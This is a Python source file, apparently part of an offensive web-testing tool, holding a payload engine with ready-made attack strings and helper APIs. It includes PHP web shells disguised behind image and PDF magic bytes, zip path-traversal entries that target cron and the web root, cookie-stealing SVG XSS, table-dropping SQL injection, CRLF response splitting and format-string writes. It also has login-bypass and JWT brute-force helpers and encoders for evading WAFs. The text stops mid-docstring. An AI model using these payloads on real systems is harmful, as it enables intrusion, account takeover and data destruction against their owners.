            ("shell.php.jpg", "Double extension: PHP with JPG suffix (Apache may execute as PHP)"),
            ("shell.php%00.jpg", "Null byte extension truncation (older PHP/servers)"),
            ("shell.pHp", "Mixed case PHP extension bypass"),
            ("shell.php5", "PHP5 extension (Apache php5 handler)"),
            ("shell.php7", "PHP7 extension variant"),
            ("shell.phtml", "PHTML extension (Apache PHP handler)"),
            ("shell.pht", "PHT extension (Apache PHP handler)"),
            ("shell.phps", "PHPS extension (may show source or execute)"),
            ("shell.php.png", "Double extension with PNG suffix"),
            ("shell.php.gif", "Double extension with GIF suffix"),
            ("shell.php.", "Trailing dot (Windows strips trailing dots)"),
            ("shell.php ", "Trailing space (Windows strips trailing spaces)"),
            ("shell.php::$DATA", "NTFS Alternate Data Stream (Windows/IIS)"),
            ("shell.php%20", "URL-encoded trailing space"),
            ("shell.php%0a", "URL-encoded newline in extension"),
            ("shell.php;.jpg", "Semicolon extension (IIS path parameter)"),
            (".htaccess", "Apache config: add PHP handler for custom extensions"),
            ("shell.PhP7", "PHP7 mixed case extension"),
            ("shell.php.bak", "Backup extension with PHP prefix"),
            ("shell.shtml", "Server Side Includes extension"),
            ("shell.asa", "ASP alternative extension"),
            ("shell.cer", "Certificate extension (IIS may execute as ASP)"),
            ("shell.aspx;.jpg", "ASPX with IIS semicolon bypass"),
            ("web.config", "IIS web.config for handler manipulation"),
        ]
        for filename, desc in extension_bypasses:
            payloads.append(Payload(
                value=filename,
                description=f"Extension bypass: {desc}",
                detection_hint=f"File '{filename}' uploaded successfully despite extension restrictions",
                sub_type="extension_bypass",
                severity="high",
                tags=["file_upload", "extension_bypass"],
            ))

        # ============================================================ #
        #  Content-Type Bypass
        # ============================================================ #
        content_type_bypasses = [
            ("image/jpeg", "Masquerade PHP shell as JPEG image"),
            ("image/png", "Masquerade as PNG image"),
            ("image/gif", "Masquerade as GIF image"),
            ("image/svg+xml", "SVG content type (may contain JavaScript)"),
            ("application/octet-stream", "Generic binary stream content type"),
            ("text/plain", "Plain text content type"),
            ("application/pdf", "PDF content type"),
            ("application/x-httpd-php", "Explicit PHP content type (may bypass whitelist)"),
        ]
        for ct, desc in content_type_bypasses:
            payloads.append(Payload(
                value=ct,
                description=f"Content-Type bypass: {desc}",
                detection_hint=f"Server accepts upload with Content-Type: {ct} despite file being executable",
                sub_type="content_type_bypass",
                severity="high",
                tags=["file_upload", "content_type"],
            ))

        # ============================================================ #
        #  Magic Byte Prepended Shells
        # ============================================================ #
        payloads.append(Payload(
            value="GIF89a; <?php system($_GET['cmd']); ?>",
            description="GIF magic bytes (GIF89a) prepended to PHP web shell",
            detection_hint="Passes file magic validation as GIF, but executes as PHP on server",
            sub_type="magic_byte",
            severity="critical",
            tags=["file_upload", "magic_byte", "gif", "webshell"],
        ))
        payloads.append(Payload(
            value="GIF87a; <?php system($_GET['cmd']); ?>",
            description="GIF87a magic bytes prepended to PHP shell (older GIF format)",
            detection_hint="Passes GIF87a magic check, executes as PHP",
            sub_type="magic_byte",
            severity="critical",
            tags=["file_upload", "magic_byte", "gif", "webshell"],
        ))
        payloads.append(Payload(
            value="\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>",
            description="PNG magic bytes (\\x89PNG) prepended to PHP shell",
            detection_hint="Passes PNG magic byte validation, executes as PHP",
            sub_type="magic_byte",
            severity="critical",
            tags=["file_upload", "magic_byte", "png", "webshell"],
        ))
        payloads.append(Payload(
            value="\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
            description="JPEG/JFIF magic bytes (\\xFF\\xD8\\xFF\\xE0) prepended to PHP shell",
            detection_hint="Passes JPEG magic byte validation, executes as PHP",
            sub_type="magic_byte",
            severity="critical",
            tags=["file_upload", "magic_byte", "jpeg", "webshell"],
        ))
        payloads.append(Payload(
            value="%PDF-1.5\n<?php system($_GET['cmd']); ?>",
            description="PDF magic bytes prepended to PHP shell",
            detection_hint="Passes PDF magic validation, may execute as PHP",
            sub_type="magic_byte",
            severity="critical",
            tags=["file_upload", "magic_byte", "pdf", "webshell"],
        ))

        # ============================================================ #
        #  SVG XSS Upload
        # ============================================================ #
        payloads.append(Payload(
            value='<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
            description="SVG with embedded JavaScript: XSS when SVG file is viewed",
            detection_hint="Alert triggers when uploaded SVG is accessed/rendered by browser",
            sub_type="svg_xss",
            severity="high",
            tags=["file_upload", "svg", "xss"],
        ))
        payloads.append(Payload(
            value='<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">',
            description="SVG with onload event handler for cookie theft",
            detection_hint="Cookie stolen when SVG rendered in browser",
            sub_type="svg_xss",
            severity="high",
            tags=["file_upload", "svg", "xss", "cookie_theft"],
        ))
        payloads.append(Payload(
            value='<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(1)"></iframe></body></foreignObject></svg>',
            description="SVG with foreignObject containing HTML iframe XSS",
            detection_hint="JavaScript executes through SVG→foreignObject→iframe chain",
            sub_type="svg_xss",
            severity="high",
            tags=["file_upload", "svg", "xss", "foreignobject"],
        ))

        # ============================================================ #
        #  Archive-Based Attacks
        # ============================================================ #
        payloads.append(Payload(
            value="../../../etc/cron.d/malicious",
            description="Zip path traversal: file extracted to /etc/cron.d (cron job injection)",
            detection_hint="File extracted outside intended upload directory to cron.d",
            sub_type="archive",
            severity="critical",
            tags=["file_upload", "zip", "path_traversal", "rce"],
        ))
        payloads.append(Payload(
            value="../../../var/www/html/shell.php",
            description="Zip path traversal: extract PHP shell to web root",
            detection_hint="Web shell placed in document root via archive extraction",
            sub_type="archive",
            severity="critical",
            tags=["file_upload", "zip", "path_traversal", "webshell"],
        ))
        payloads.append(Payload(
            value="symlink_to_etc_passwd",
            description="Zip symlink attack: create symlink to /etc/passwd in archive",
            detection_hint="Extracted symlink allows reading /etc/passwd through file serve",
            sub_type="archive",
            severity="critical",
            tags=["file_upload", "zip", "symlink"],
        ))
        payloads.append(Payload(
            value="zip_bomb_42.zip",
            description="Zip bomb: highly compressed file that expands to exhaust disk/memory",
            detection_hint="Server disk fills up or process crashes during extraction",
            sub_type="archive",
            severity="high",
            tags=["file_upload", "zip", "dos"],
        ))

        # ============================================================ #
        #  Juice Shop File Upload
        # ============================================================ #
        payloads.append(Payload(
            value="application/xml",
            description="Juice Shop complaint file upload: XML content type for XXE",
            detection_hint="Upload XML file as complaint attachment to trigger XXE processing",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            tags=["file_upload", "juice_shop", "xxe"],
        ))
        payloads.append(Payload(
            value="100KB_placeholder.zip",
            description="Juice Shop: file size limit bypass test (max 100KB)",
            detection_hint="File exceeding limit accepted or useful error returned",
            sub_type="juice_shop",
            severity="medium",
            juice_shop=True,
            tags=["file_upload", "juice_shop", "size_limit"],
        ))

        return payloads

    # ================================================================== #
    #  INPUT VALIDATION BYPASS PAYLOADS (40+)
    # ================================================================== #
    def _build_input_validation_payloads(self) -> List[Payload]:
        payloads: List[Payload] = []

        # ============================================================ #
        #  Negative Numbers
        # ============================================================ #
        negative_values = [
            ("-1", "Negative one: may result in credit/refund instead of charge"),
            ("-0.01", "Minimal negative: bypasses positive-only check but small amount"),
            ("-100", "Negative price: $100 credit to account instead of debit"),
            ("-999", "Large negative: maximum credit exploit"),
            ("-999999", "Extreme negative: catastrophic credit if accepted"),
            ("-0.001", "Sub-penny negative: may bypass minimum amount validation"),
            ("-1e2", "Scientific notation negative: -100 in disguise"),
            ("-2147483648", "Min 32-bit integer: potential integer underflow"),
        ]
        for value, desc in negative_values:
            payloads.append(Payload(
                value=value,
                description=f"Negative number: {desc}",
                detection_hint="Negative value accepted. Account credited or price reduced below zero",
                sub_type="negative_number",
                severity="high",
                juice_shop=True if value in ("-1", "-100") else False,
                tags=["input_validation", "negative", "business_logic"],
            ))

        # ============================================================ #
        #  Zero Values
        # ============================================================ #
        zero_values = [
            ("0", "Zero value: free item or division by zero error"),
            ("0.00", "Explicit zero decimal: zero-cost transaction"),
            ("0.001", "Near-zero: may round to zero in payment but item processed"),
            ("0.0000001", "Very small positive: rounding to zero exploit"),
            ("0e0", "Scientific notation zero: may bypass non-zero validation"),
            ("-0", "Negative zero: IEEE 754 edge case"),
            ("0.00000000001", "Extremely small: 11 decimal places"),
        ]
        for value, desc in zero_values:
            payloads.append(Payload(
                value=value,
                description=f"Zero/near-zero value: {desc}",
                detection_hint="Zero or near-zero accepted. Free purchase or calculation error",
                sub_type="zero_value",
                severity="high",
                tags=["input_validation", "zero", "business_logic"],
            ))

        # ============================================================ #
        #  Extremely Large Numbers
        # ============================================================ #
        large_values = [
            ("99999999999999999", "17-digit number: may overflow 64-bit integer"),
            ("9999999999999999999999999999", "28-digit: exceeds all integer types"),
            ("9".join(["9"] * 100), "100 nines: extreme length number"),
            ("1e308", "Near max float: may become Infinity"),
            ("1e309", "Exceeds max float: guaranteed Infinity or error"),
            ("2147483647", "Max 32-bit signed integer: boundary test"),
            ("2147483648", "Max 32-bit signed int + 1: overflow to negative"),
            ("4294967295", "Max 32-bit unsigned integer"),
            ("4294967296", "Max 32-bit unsigned + 1: overflow to 0"),
            ("9007199254740991", "Max safe integer in JavaScript (Number.MAX_SAFE_INTEGER)"),
            ("9007199254740992", "MAX_SAFE_INTEGER + 1: precision loss in JavaScript"),
            ("9223372036854775807", "Max 64-bit signed integer"),
            ("9223372036854775808", "Max 64-bit signed + 1: overflow"),
        ]
        for value, desc in large_values:
            payloads.append(Payload(
                value=value,
                description=f"Large number: {desc}",
                detection_hint="Integer overflow, precision loss, Infinity, or server error/crash",
                sub_type="large_number",
                severity="high",
                tags=["input_validation", "overflow", "boundary"],
            ))

        # ============================================================ #
        #  Special Numeric Values
        # ============================================================ #
        special_values = [
            ("NaN", "Not a Number: propagates through calculations"),
            ("Infinity", "Positive infinity: breaks calculations"),
            ("-Infinity", "Negative infinity: breaks calculations"),
            ("undefined", "JavaScript undefined: type confusion"),
            ("null", "Null value: null reference errors"),
            ("None", "Python None: type confusion"),
            ("nil", "Ruby/Go nil: type confusion"),
        ]
        for value, desc in special_values:
            payloads.append(Payload(
                value=value,
                description=f"Special value: {desc}",
                detection_hint="Value accepted and causes unexpected behavior in calculations or comparisons",
                sub_type="special_value",
                severity="medium",
                tags=["input_validation", "special_value", "type_confusion"],
            ))

        # ============================================================ #
        #  Special Characters in Text Fields
        # ============================================================ #
        payloads.append(Payload(
            value="<script>alert(1)</script>",
            description="XSS probe in name/text field: test if output is HTML-encoded",
            detection_hint="Script tag appears unencoded in rendered page",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "xss", "encoding_test"],
        ))
        payloads.append(Payload(
            value="'; DROP TABLE Users;--",
            description="SQL injection in text field: attempt table destruction",
            detection_hint="SQL error or table actually dropped (destructive test!)",
            sub_type="special_chars",
            severity="critical",
            tags=["input_validation", "sqli"],
        ))
        payloads.append(Payload(
            value="Robert'); DROP TABLE Students;--",
            description="Bobby Tables: famous SQL injection in name field",
            detection_hint="SQL error or unexpected database modification",
            sub_type="special_chars",
            severity="critical",
            tags=["input_validation", "sqli", "bobby_tables"],
        ))
        payloads.append(Payload(
            value="\x00",
            description="Null byte in text field: may truncate string or cause parsing issues",
            detection_hint="String truncated at null byte position, or unexpected behavior",
            sub_type="special_chars",
            severity="medium",
            tags=["input_validation", "null_byte"],
        ))
        payloads.append(Payload(
            value="test\r\nX-Injected-Header: true",
            description="CRLF injection: inject HTTP headers via text input",
            detection_hint="Extra 'X-Injected-Header: true' appears in HTTP response headers",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "crlf", "header_injection"],
        ))
        payloads.append(Payload(
            value="test\r\n\r\n<html>Injected Body</html>",
            description="CRLF + HTTP response splitting: inject response body",
            detection_hint="Injected HTML appears after double CRLF in response",
            sub_type="special_chars",
            severity="critical",
            tags=["input_validation", "crlf", "response_splitting"],
        ))
        payloads.append(Payload(
            value="${7*7}",
            description="Server-side template injection probe (Freemarker/Velocity)",
            detection_hint="Output shows '49' instead of literal '${7*7}' = SSTI confirmed",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "ssti", "template_injection"],
        ))
        payloads.append(Payload(
            value="{{7*7}}",
            description="Template injection probe for Jinja2/Angular/Twig",
            detection_hint="Output shows '49' = template engine processing user input",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "ssti", "template_injection"],
        ))
        payloads.append(Payload(
            value="<%= 7*7 %>",
            description="ERB template injection probe (Ruby)",
            detection_hint="Output shows '49' = Ruby ERB template processing input",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "ssti", "erb"],
        ))
        payloads.append(Payload(
            value="#{7*7}",
            description="Ruby/Pug template injection probe",
            detection_hint="Output shows '49' = Ruby string interpolation or Pug template",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "ssti"],
        ))
        payloads.append(Payload(
            value="*{7*7}",
            description="Thymeleaf SSTI probe (Java Spring)",
            detection_hint="Output shows '49' = Thymeleaf template processing",
            sub_type="special_chars",
            severity="high",
            tags=["input_validation", "ssti", "thymeleaf"],
        ))

        # ============================================================ #
        #  Empty/Whitespace Values
        # ============================================================ #
        empty_values = [
            ("", "Empty string: bypass required field validation"),
            (" ", "Single space: passes non-empty check but contains no data"),
            ("   ", "Multiple spaces: whitespace-only input"),
            ("\t", "Tab character: non-visible whitespace"),
            ("\n", "Newline: may break display or log injection"),
            ("\r\n", "CRLF: Windows newline may cause issues"),
            ("\x0b", "Vertical tab: rare whitespace character"),
            ("\x0c", "Form feed: rare whitespace character"),
            ("\u00a0", "Non-breaking space: looks like space but different byte"),
            ("\u200b", "Zero-width space: invisible Unicode character"),
            ("\u200e", "Left-to-right mark: invisible Unicode direction marker"),
            ("\ufeff", "BOM (Byte Order Mark): invisible Unicode character"),
        ]
        for value, desc in empty_values:
            payloads.append(Payload(
                value=value,
                description=f"Empty/whitespace: {desc}",
                detection_hint="Value accepted for field that should require meaningful input",
                sub_type="empty",
                severity="medium",
                tags=["input_validation", "empty", "whitespace"],
            ))

        # ============================================================ #
        #  Type Juggling / Type Confusion
        # ============================================================ #
        type_juggling_values = [
            ("true", "Boolean true string: loose comparison may treat as truthy"),
            ("false", "Boolean false string: loose comparison may treat as falsy"),
            ("null", "Null string: may be parsed as actual null"),
            ("undefined", "Undefined string: JavaScript specific type confusion"),
            ("[]", "Empty array string: falsy in some comparisons"),
            ("{}", "Empty object string: truthy but empty"),
            ("[object Object]", "JS object toString output: may match unexpected comparisons"),
            ("0e12345", "PHP magic hash: '0e...' == 0 in loose comparison (== evaluates scientific notation)"),
            ("0e462097431906509019562988736854", "MD5 collision hash: equals 0 in PHP loose comparison"),
            ("240610708", "String whose MD5 starts with 0e: PHP magic hash collision"),
            ("QNKCDZO", "Another MD5 0e hash collision string"),
            ("aabg7XSs", "Another MD5 0e hash collision string"),
            ("1", "Integer 1 as string: may be compared loosely with true"),
            ("0", "Integer 0 as string: may be compared loosely with false/null/empty"),
            ("-1", "Negative 1 string: truthy but unexpected numeric value"),
            ("Array", "The word 'Array': PHP casts array to this string"),
            ("1/0", "Division by zero expression: may cause server error"),
        ]
        for value, desc in type_juggling_values:
            payloads.append(Payload(
                value=value,
                description=f"Type juggling: {desc}",
                detection_hint="Loose comparison bypass or unexpected type conversion behavior",
                sub_type="type_juggling",
                severity="medium" if "magic" not in desc.lower() else "high",
                tags=["input_validation", "type_juggling", "comparison_bypass"],
            ))

        # ============================================================ #
        #  Juice Shop Specific Input Validation
        # ============================================================ #
        payloads.append(Payload(
            value="-100",
            description="Juice Shop: negative quantity in basket to get credit",
            detection_hint="Negative quantity accepted, total price becomes negative = free items",
            sub_type="juice_shop",
            severity="critical",
            juice_shop=True,
            tags=["input_validation", "juice_shop", "business_logic", "negative"],
        ))
        payloads.append(Payload(
            value="0",
            description="Juice Shop: zero quantity in basket",
            detection_hint="Zero quantity accepted, item in basket with no cost",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            tags=["input_validation", "juice_shop", "business_logic", "zero"],
        ))
        payloads.append(Payload(
            value="WMNSDY2019",
            description="Juice Shop: known coupon code (Women's Day 2019)",
            detection_hint="Coupon applied successfully for discount",
            sub_type="juice_shop",
            severity="medium",
            juice_shop=True,
            tags=["input_validation", "juice_shop", "coupon"],
        ))
        payloads.append(Payload(
            value="null",
            description="Juice Shop: null in coupon field may bypass validation",
            detection_hint="Null value accepted or causes unexpected discount",
            sub_type="juice_shop",
            severity="medium",
            juice_shop=True,
            tags=["input_validation", "juice_shop", "coupon", "null"],
        ))
        payloads.append(Payload(
            value="0.0000000000001",
            description="Juice Shop: extremely small payment amount (rounding exploit)",
            detection_hint="Amount rounds to zero but transaction processes with items",
            sub_type="juice_shop",
            severity="high",
            juice_shop=True,
            tags=["input_validation", "juice_shop", "rounding", "payment"],
        ))

        # ============================================================ #
        #  Format String Attacks
        # ============================================================ #
        payloads.append(Payload(
            value="%s%s%s%s%s",
            description="Format string: multiple %s may read stack memory",
            detection_hint="Unexpected data in response from stack memory disclosure",
            sub_type="format_string",
            severity="high",
            tags=["input_validation", "format_string"],
        ))
        payloads.append(Payload(
            value="%x%x%x%x%x",
            description="Format string: hex dump of stack memory",
            detection_hint="Hexadecimal values from stack in response",
            sub_type="format_string",
            severity="high",
            tags=["input_validation", "format_string", "memory_leak"],
        ))
        payloads.append(Payload(
            value="%n%n%n%n%n",
            description="Format string write: %n writes byte count to memory (dangerous)",
            detection_hint="Application crash or unexpected behavior from memory write",
            sub_type="format_string",
            severity="critical",
            tags=["input_validation", "format_string", "memory_write"],
        ))
        payloads.append(Payload(
            value="{0}{1}{2}{3}{4}",
            description="Python/C# format string: indexed placeholder injection",
            detection_hint="Internal data disclosed through format string processing",
            sub_type="format_string",
            severity="high",
            tags=["input_validation", "format_string", "python"],
        ))

        # ============================================================ #
        #  Unicode / Internationalization Issues
        # ============================================================ #
        payloads.append(Payload(
            value="test™®©",
            description="Special symbols: trademark, registered, copyright",
            detection_hint="Characters cause encoding issues or are stripped unexpectedly",
            sub_type="unicode",
            severity="low",
            tags=["input_validation", "unicode", "encoding"],
        ))
        payloads.append(Payload(
            value="test\u202eRTL_OVERRIDE",
            description="Unicode RTL override (U+202E): reverses text display direction",
            detection_hint="Text appears reversed in UI, can disguise file extensions",
            sub_type="unicode",
            severity="medium",
            tags=["input_validation", "unicode", "rtl_override"],
        ))
        payloads.append(Payload(
            value="admin\u0000extra",
            description="Unicode null character in middle of string",
            detection_hint="String truncated at null, 'admin' processed instead of 'admin\\0extra'",
            sub_type="unicode",
            severity="medium",
            tags=["input_validation", "unicode", "null_byte"],
        ))
        payloads.append(Payload(
            value="\u0041\u0064\u006d\u0069\u006e",
            description="Unicode escaped 'Admin': bypasses literal string comparison",
            detection_hint="Unicode 'Admin' may bypass case-sensitive or literal match filters",
            sub_type="unicode",
            severity="medium",
            tags=["input_validation", "unicode", "bypass"],
        ))
        payloads.append(Payload(
            value="ﬁle:///etc/passwd",
            description="Unicode ligature 'fi' (U+FB01) in 'file://': URL filter bypass",
            detection_hint="Some normalizers convert ﬁ→fi, bypassing 'file://' filter",
            sub_type="unicode",
            severity="high",
            tags=["input_validation", "unicode", "ligature", "bypass"],
        ))

        # ============================================================ #
        #  Length Boundary Tests
        # ============================================================ #
        payloads.append(Payload(
            value="A" * 256,
            description="256 character string: common field length boundary",
            detection_hint="Truncation, error, or buffer overflow at 256 char boundary",
            sub_type="length",
            severity="medium",
            tags=["input_validation", "length", "boundary"],
        ))
        payloads.append(Payload(
            value="A" * 1024,
            description="1024 character string: 1KB input for medium-length fields",
            detection_hint="Field truncation or server error at 1KB",
            sub_type="length",
            severity="medium",
            tags=["input_validation", "length", "boundary"],
        ))
        payloads.append(Payload(
            value="A" * 65536,
            description="64KB string: may cause memory issues or buffer overflow",
            detection_hint="Server crash, timeout, or truncation at 64KB",
            sub_type="length",
            severity="high",
            tags=["input_validation", "length", "overflow", "dos"],
        ))
        payloads.append(Payload(
            value="A" * 1048576,
            description="1MB string: extreme length for DoS or buffer overflow testing",
            detection_hint="Server timeout, crash, or memory exhaustion with 1MB input",
            sub_type="length",
            severity="high",
            tags=["input_validation", "length", "dos"],
        ))

        return payloads

    # ================================================================ #
    # PART 2 ENDS HERE
    # The public API methods are in PART 3
    # ================================================================ #
    
    
        # ================================================================== #
    # PART 3 - Paste this directly after _build_input_validation_payloads()
    # These are all PUBLIC API methods of the PayloadEngine class
    # ================================================================== #

    # ================================================================== #
    #  PRIMARY API: get_payloads()
    # ================================================================== #
    def get_payloads(self, attack_type: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Get payloads for a specific attack type, prioritized by context.

        Args:
            attack_type: One of "sqli", "xss", "auth_bypass", "idor",
                         "path_traversal", "nosqli", "xxe", "ssrf",
                         "jwt", "file_upload", "input_validation"
            context: Optional dict with keys:
                     - db_type: "sqlite", "mysql", "postgresql", "mssql"
                     - framework: "angular", "react", "vue", "express", "django", "flask", "spring"
                     - waf: "none", "cloudflare", "akamai", "modsecurity", "aws_waf"
                     - os: "linux", "windows"
                     - juice_shop: True/False (prioritize Juice Shop payloads)
                     - sub_type: filter by specific sub_type
                     - severity: filter by minimum severity
                     - tags: list of tags to filter by

        Returns:
            List of payload dicts, sorted by relevance score (highest first).
        """
        if context is None:
            context = {}

        raw_payloads = self._payloads.get(attack_type, [])
        if not raw_payloads:
            available_types = list(self._payloads.keys())
            raise ValueError(
                f"Unknown attack type '{attack_type}'. Available: {available_types}"
            )

        sub_type_filter = context.get("sub_type", "")
        severity_filter = context.get("severity", "")
        tag_filter = context.get("tags", [])

        if sub_type_filter:
            raw_payloads = [p for p in raw_payloads if p.sub_type == sub_type_filter]

        if tag_filter:
            if isinstance(tag_filter, str):
                tag_filter = [tag_filter]
            raw_payloads = [
                p for p in raw_payloads
                if any(t in p.tags for t in tag_filter)
            ]

        severity_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        if severity_filter:
            min_rank = severity_rank.get(severity_filter.lower(), 0)
            raw_payloads = [
                p for p in raw_payloads
                if severity_rank.get(p.severity, 0) >= min_rank
            ]

        db_type = context.get("db_type", "").lower()
        framework = context.get("framework", "").lower()
        waf = context.get("waf", "none").lower()
        target_os = context.get("os", "").lower()
        is_juice_shop = context.get("juice_shop", False)

        scored_payloads: List[Tuple[int, int, Payload]] = []

        for idx, p in enumerate(raw_payloads):
            score = 50

            if db_type and p.db_specific:
                if p.db_specific.lower() == db_type:
                    score += 40
                elif p.db_specific.lower() == "generic":
                    score += 10
                else:
                    score -= 20

            if framework and p.framework_specific:
                if p.framework_specific.lower() == framework:
                    score += 40
                else:
                    score -= 15

            if framework and not p.framework_specific:
                score += 0

            if waf and waf != "none":
                if p.waf_bypass:
                    score += 35
                else:
                    score -= 10

            if target_os and p.os_specific:
                if p.os_specific.lower() == target_os:
                    score += 25
                else:
                    score -= 25

            if is_juice_shop and p.juice_shop:
                score += 50

            sev_score = {"critical": 20, "high": 12, "medium": 5, "low": 1}
            score += sev_score.get(p.severity, 0)

            if p.waf_bypass:
                score += 5

            if p.juice_shop and is_juice_shop:
                score += 10

            scored_payloads.append((score, idx, p))

        scored_payloads.sort(key=lambda x: (-x[0], x[1]))

        results: List[Dict] = []
        for score, idx, p in scored_payloads:
            d = p.to_dict()
            d["relevance_score"] = score
            results.append(d)

        return results

    # ================================================================== #
    #  LOGIN-SPECIFIC PAYLOADS
    # ================================================================== #
    def get_login_payloads(self, context: Optional[Dict] = None) -> List[Dict]:
        """
        Get payloads specifically designed for login form bypass.
        Combines SQL injection login, NoSQL injection login, default creds,
        and relevant SQLi tautology payloads.

        Args:
            context: Optional context dict (same as get_payloads)

        Returns:
            List of payload dicts optimized for login bypass.
        """
        if context is None:
            context = {}

        login_payloads: List[Dict] = []
        seen_values = set()

        auth_payloads = self._payloads.get("auth_bypass", [])
        for p in auth_payloads:
            if p.sub_type in ("sqli_login", "nosqli_login", "default_creds", "jwt", "password_reset"):
                if p.value not in seen_values:
                    d = p.to_dict()
                    d["category"] = "auth_bypass"
                    login_payloads.append(d)
                    seen_values.add(p.value)

        sqli_payloads = self._payloads.get("sqli", [])
        login_keywords = ["OR 1=1", "admin'", "OR ''='", "OR 'x'='x", "OR 1=1 LIMIT"]
        for p in sqli_payloads:
            if p.sub_type == "error_based":
                if any(kw in p.value for kw in login_keywords):
                    if p.value not in seen_values:
                        d = p.to_dict()
                        d["category"] = "sqli"
                        login_payloads.append(d)
                        seen_values.add(p.value)

        nosql_payloads = self._payloads.get("nosqli", [])
        for p in nosql_payloads:
            if p.sub_type in ("url_param", "json_body"):
                if p.value not in seen_values:
                    d = p.to_dict()
                    d["category"] = "nosqli"
                    login_payloads.append(d)
                    seen_values.add(p.value)

        db_type = context.get("db_type", "").lower()
        is_juice_shop = context.get("juice_shop", False)

        def login_sort_key(item: Dict) -> int:
            s = 50
            if is_juice_shop and item.get("juice_shop"):
                s += 50
            if db_type and item.get("db_specific", "").lower() == db_type:
                s += 30
            sev = {"critical": 20, "high": 10, "medium": 5, "low": 1}
            s += sev.get(item.get("severity", "medium"), 0)
            if item.get("category") == "auth_bypass":
                s += 10
            return s

        login_payloads.sort(key=lambda x: login_sort_key(x), reverse=True)

        return login_payloads

    # ================================================================== #
    #  JWT-SPECIFIC HELPERS
    # ================================================================== #
    def get_jwt_secrets(self) -> List[str]:
        """
        Get list of common JWT secrets for brute force attacks.

        Returns:
            List of secret strings to try for HS256/HS384/HS512 signing.
        """
        jwt_payloads = self._payloads.get("jwt", [])
        secrets: List[str] = []
        seen = set()
        for p in jwt_payloads:
            if p.sub_type == "weak_secret" and p.value not in seen:
                secrets.append(p.value)
                seen.add(p.value)
        return secrets

    def get_jwt_none_headers(self) -> List[str]:
        """
        Get all none-algorithm JWT header variants.

        Returns:
            List of JSON header strings with none algorithm variants.
        """
        jwt_payloads = self._payloads.get("jwt", [])
        headers: List[str] = []
        for p in jwt_payloads:
            if p.sub_type == "none_alg":
                headers.append(p.value)
        return headers

    def get_jwt_tampered_payloads(self) -> List[str]:
        """
        Get JWT payload bodies for privilege escalation.

        Returns:
            List of JSON payload strings with escalated claims.
        """
        jwt_payloads = self._payloads.get("jwt", [])
        tampered: List[str] = []
        for p in jwt_payloads:
            if p.sub_type == "payload_tampering":
                tampered.append(p.value)
        return tampered

    def get_jwt_header_injections(self) -> List[str]:
        """
        Get JWT header injection payloads (kid, jku, x5u manipulation).

        Returns:
            List of JSON header strings with injection payloads.
        """
        jwt_payloads = self._payloads.get("jwt", [])
        injections: List[str] = []
        for p in jwt_payloads:
            if p.sub_type == "header_injection":
                injections.append(p.value)
        return injections

    # ================================================================== #
    #  DEFAULT CREDENTIALS
    # ================================================================== #
    def get_default_credentials(self) -> List[Tuple[str, str]]:
        """
        Get list of default credential pairs (username, password).

        Returns:
            List of (username, password) tuples.
        """
        auth_payloads = self._payloads.get("auth_bypass", [])
        creds: List[Tuple[str, str]] = []
        for p in auth_payloads:
            if p.sub_type == "default_creds" and ":" in p.value:
                parts = p.value.split(":", 1)
                creds.append((parts[0], parts[1]))
        return creds

    # ================================================================== #
    #  ENCODING ENGINE
    # ================================================================== #
    def encode_payload(self, payload: str, encoding: str) -> str:
        """
        Encode a payload using the specified encoding method.

        Args:
            payload: The raw payload string to encode.
            encoding: One of:
                "url" - URL percent encoding
                "double_url" - Double URL encoding
                "html" - HTML entity encoding (named entities)
                "html_hex" - HTML hex entity encoding (&#xNN;)
                "html_dec" - HTML decimal entity encoding (&#NN;)
                "base64" - Base64 encoding
                "hex" - Hex escape encoding (\\xNN)
                "unicode" - Unicode escape encoding (\\uNNNN)
                "octal" - Octal escape encoding (\\NNN)
                "char_code" - JavaScript String.fromCharCode()

        Returns:
            The encoded payload string.

        Raises:
            ValueError: If encoding method is unknown.
        """
        encoding = encoding.lower().strip()

        if encoding == "url":
            return urllib.parse.quote(payload, safe="")

        elif encoding == "double_url":
            first_pass = urllib.parse.quote(payload, safe="")
            return urllib.parse.quote(first_pass, safe="")

        elif encoding == "html":
            return html.escape(payload, quote=True)

        elif encoding == "html_hex":
            result = ""
            for c in payload:
                result += f"&#x{ord(c):02x};"
            return result

        elif encoding == "html_dec":
            result = ""
            for c in payload:
                result += f"&#{ord(c)};"
            return result

        elif encoding == "base64":
            encoded_bytes = base64.b64encode(payload.encode("utf-8"))
            return encoded_bytes.decode("utf-8")

        elif encoding == "hex":
            result = ""
            for c in payload:
                result += f"\\x{ord(c):02x}"
            return result

        elif encoding == "unicode":
            result = ""
            for c in payload:
                result += f"\\u{ord(c):04x}"
            return result

        elif encoding == "octal":
            result = ""
            for c in payload:
                result += f"\\{ord(c):03o}"
            return result

        elif encoding == "char_code":
            codes = [str(ord(c)) for c in payload]
            return f"String.fromCharCode({','.join(codes)})"

        else:
            available = [
                "url", "double_url", "html", "html_hex", "html_dec",
                "base64", "hex", "unicode", "octal", "char_code"
            ]
            raise ValueError(f"Unknown encoding '{encoding}'. Available: {available}")

    def multi_encode(self, payload: str, encodings: List[str]) -> str:
        """
        Apply multiple encodings in sequence.

        Args:
            payload: The raw payload string.
            encodings: List of encoding names to apply in order.

        Returns:
            The multi-encoded payload string.

        Example:
            engine.multi_encode("' OR 1=1--", ["url", "url"])  # double URL encode
            engine.multi_encode("<script>alert(1)</script>", ["html", "url"])
        """
        result = payload
        for enc in encodings:
            result = self.encode_payload(result, enc)
        return result

    # ================================================================== #
    #  VARIATION GENERATOR
    # ================================================================== #
    def generate_variations(self, payload: str) -> List[str]:
        """
        Generate WAF bypass variations of a given payload.
        Includes case changes, encoding, comment insertion,
        whitespace tricks, and obfuscation techniques.

